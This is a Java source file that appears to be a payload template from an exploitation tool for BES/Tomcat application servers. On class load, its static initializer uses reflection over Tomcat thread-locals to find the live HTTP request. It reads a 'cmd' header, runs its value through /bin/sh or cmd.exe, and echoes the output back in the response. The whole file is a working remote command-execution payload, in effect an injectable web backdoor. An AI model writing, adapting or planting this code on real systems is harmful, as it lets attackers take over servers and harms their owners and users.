package jeg.core.template.bes;

import jeg.core.template.jetty.JettyCmdExecTpl;

import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.Set;

public class BESCmdExecTpl {
    static {
        try {
            new BESCmdExecTpl();
        } catch (Exception e) {
        }
    }

    private static String getReqHeaderName() {
        return "cmd";
    }

    public BESCmdExecTpl() throws InvocationTargetException, NoSuchMethodException, IllegalAccessException {
        run();
    }

    public void run() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Set<Thread> threadSet = Thread.getAllStackTraces().keySet();
        List<Thread> taskThreadList = new ArrayList();
        for (Thread thread : threadSet) {
            if (thread.getClass().getName().contains("org.apache.tomcat.util.threads.TaskThread")) {
                // 将目标对象添加到列表中
                taskThreadList.add(thread);
            }
        }
        List<Object> tables = new ArrayList();
        for (Thread thread : taskThreadList) {
            try {
                Field threadLocalsField = Thread.class.getDeclaredField("threadLocals");
                threadLocalsField.setAccessible(true);
                Object localMap = threadLocalsField.get(thread);
                Class<?> threadLocalMapClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
                Field tableField = threadLocalMapClass.getDeclaredField("table");
                tableField.setAccessible(true);
                Object table = tableField.get(localMap);
                tables.add(table);
            } catch (Exception e) {
                continue;
            }
        }

        List<Object> values = new ArrayList();
        for (Object table : tables) {
            // 遍历 table 中的项
            try {
                if (table != null && table.getClass().isArray()) {
                    int length = Array.getLength(table);
                    for (int i = 0; i < length; i++) {
                        Object entry = Array.get(table, i);
                        if (entry != null) {
                            // 获取 entry 的 value 字段
                            try {
                                Field valueField = entry.getClass().getDeclaredField("value");
                                valueField.setAccessible(true);
                                Object value = valueField.get(entry);
                                values.add(value);
                            } catch (Exception e) {
                            }
                        }
                    }
                }
            } catch (Exception e) {
            }

        }

        for (Object value : values) {
            if (value != null && value.getClass().getName().equals("org.apache.catalina.connector.Request")) {
                try {
                    // 从 request header 获取参数
                    String cmd = (String) value.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(value, new Object[]{getReqHeaderName()});
                    if (cmd != null) {
                        Object response = value.getClass().getMethod("getResponse", new Class[0]).invoke(value);
                        Writer writer = (Writer) response.getClass().getMethod("getWriter", new Class[0]).invoke(response, new Object[0]);
                        writer.write(executeCommand(cmd));
                        writer.flush();
                        writer.close();
                        break;
                    }
                } catch (Exception ignored) {
                }
            }
        }
    }

    // 执行模块
    public static String executeCommand(String cmd) {
        if (cmd == null) {
            return "command is null";
        }
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String execRes = "";
            while (s.hasNext()) {
                execRes += s.next();
            }
            if (execRes.isEmpty()) {
                return String.format("code exec successfully, command:%s fails. The command may not exist!\n", cmd);
            }
            return execRes;
        } catch (Exception e) {
            return String.format( e.getMessage());
        }
    }
}